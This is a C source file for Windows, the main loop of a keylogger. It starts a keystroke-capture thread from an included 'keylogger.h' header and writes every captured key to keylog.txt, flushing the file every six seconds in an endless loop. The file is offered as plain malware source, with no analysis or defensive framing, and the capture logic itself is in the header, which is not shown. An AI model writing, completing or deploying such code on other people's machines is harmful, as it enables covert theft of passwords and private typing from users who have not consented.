#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "keylogger.h"

void main() {
    char key[20];
    struct QueueKeylog* q = createQueueKeylog();
    HANDLE thread = startKeylogger(q);
    // Open an external file for writing captured keys
    FILE* outputFile = fopen("keylog.txt", "w");
    if (outputFile == NULL) {
        printf("Error: Unable to open the output file for writing.\n");
        exit(1);
    }

    while (1) {
        while (getKeylog(q, key)) {
            // Write captured keys to the external file
            fprintf(outputFile, "%s", key);
        }
        fflush(outputFile); // Flush the file buffer to ensure data is written immediately
        Sleep(6000);
    }

    fclose(outputFile); // Close the output file when done
}

